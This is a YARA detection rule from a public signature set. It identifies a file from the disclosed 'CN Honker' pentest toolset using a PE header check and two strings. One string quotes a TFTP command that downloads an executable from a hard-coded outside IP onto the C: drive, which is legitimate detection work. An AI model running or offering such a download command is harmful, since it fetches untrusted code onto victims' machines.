rule SIGNATURE_BASE_CN_Honker_D_Injection_V2_32 : FILE
{
	meta:
		description = "Sample from CN Honker Pentest Toolset - file D_injection_V2.32.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "4c661c35-61ee-5ee7-9b8e-9908fbe0362b"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c04cde449bdf5fb40bb001fb663d32a70f89abe4/yara/cn_pentestset_tools.yar#L239-L254"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c04cde449bdf5fb40bb001fb663d32a70f89abe4/LICENSE"
		hash = "3a000b976c79585f62f40f7999ef9bdd326a9513"
		logic_hash = "0107903a481b09faa92a5fbb162fd981f976ed864be3a0840b43063461e20974"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Missing %s property(CommandText does not return a result set{Error creating obje" wide
		$s1 = "/tftp -i 219.134.46.245 get 9493.exe c:\\9394.exe" fullword ascii

	condition:
		uint16(0)==0x5a4d and filesize <5000KB and all of them
}
